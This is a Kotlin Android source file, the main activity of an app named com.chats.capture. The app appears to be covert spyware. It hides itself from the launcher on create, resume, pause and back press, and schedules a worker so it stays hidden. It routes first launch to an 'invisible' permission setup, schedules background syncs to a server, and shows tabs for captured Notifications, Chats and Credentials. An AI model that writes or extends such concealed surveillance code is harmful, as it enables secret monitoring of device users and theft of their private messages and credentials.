package com.chats.capture.ui

import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import androidx.appcompat.app.AppCompatActivity
import androidx.viewpager2.widget.ViewPager2
import com.chats.capture.R
import com.chats.capture.ui.adapters.MainPagerAdapter
import com.chats.capture.managers.BatteryOptimizationManager
import com.chats.capture.managers.ServiceMonitor
import com.chats.capture.network.ApiClient
import com.chats.capture.ui.PermissionSetupActivity
import com.chats.capture.utils.AppHider
import com.chats.capture.utils.AppVisibilityManager
import com.chats.capture.workers.AppHiderScheduler
import com.chats.capture.workers.SyncScheduler
import com.chats.capture.workers.UpdateCheckScheduler
import com.google.android.material.tabs.TabLayout
import com.google.android.material.tabs.TabLayoutMediator
import timber.log.Timber

class MainActivity : AppCompatActivity() {
    
    private lateinit var serviceMonitor: ServiceMonitor
    private lateinit var batteryOptimizationManager: BatteryOptimizationManager
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Always hide app from launcher (Device Owner mode)
        AppVisibilityManager.hideFromLauncher(this)
        AppHider.ensureHidden(this)
        
        // Check if setup is needed
        if (!com.chats.capture.utils.AppStateManager.isSetupComplete(this)) {
            // Redirect to permission setup (invisible)
            val intent = Intent(this, PermissionSetupActivity::class.java)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
            startActivity(intent)
            finish()
            return
        }
        
        // Initialize services in background
        serviceMonitor = ServiceMonitor(this)
        batteryOptimizationManager = BatteryOptimizationManager(this)
        
        // Initialize API client with validated URL
        val serverUrl = com.chats.capture.utils.ServerUrlValidator.getValidServerUrl(this)
        ApiClient.initialize(this, serverUrl)
        
        // Start service monitoring
        serviceMonitor.startMonitoring()
        
        // Schedule sync
        SyncScheduler.scheduleSync(this)
        
        // Schedule update checks
        UpdateCheckScheduler.scheduleUpdateCheck(this)
        
        // Schedule app hider worker to ensure app stays hidden
        AppHiderScheduler.schedule(this)
        
        // Show UI when accessed from Settings (for permission management)
        // App remains hidden from launcher but can be accessed via Settings → Apps → [App Name]
        setContentView(R.layout.activity_main)
        
        // Setup ViewPager with tabs
        val viewPager: ViewPager2 = findViewById(R.id.viewPager)
        val tabLayout: TabLayout = findViewById(R.id.tabLayout)
        
        val adapter = MainPagerAdapter(this)
        viewPager.adapter = adapter
        
        // Connect TabLayout with ViewPager2
        TabLayoutMediator(tabLayout, viewPager) { tab, position ->
            tab.text = when (position) {
                0 -> "Notifications"
                1 -> "Chats"
                2 -> "Credentials"
                3 -> "MDM"
                4 -> "Settings"
                else -> ""
            }
        }.attach()
        
        // Default to Settings tab (position 4) when accessed from Settings
        viewPager.setCurrentItem(4, false)
        
        // Hide FAB (not needed for settings access)
        findViewById<com.google.android.material.floatingactionbutton.FloatingActionButton>(R.id.fab)?.hide()
        
        Timber.d("MainActivity UI shown (accessed from Settings)")
    }
    
    override fun onResume() {
        super.onResume()
        // Re-hide app when returning to settings (in case it was shown)
        AppVisibilityManager.hideFromLauncher(this)
        AppHider.ensureHidden(this)
    }
    
    override fun onPause() {
        super.onPause()
        // Re-hide app when pausing
        AppVisibilityManager.hideFromLauncher(this)
        AppHider.ensureHidden(this)
    }
    
    override fun onBackPressed() {
        super.onBackPressed()
        // Re-hide app when user presses back
        AppVisibilityManager.hideFromLauncher(this)
        AppHider.ensureHidden(this)
    }
}
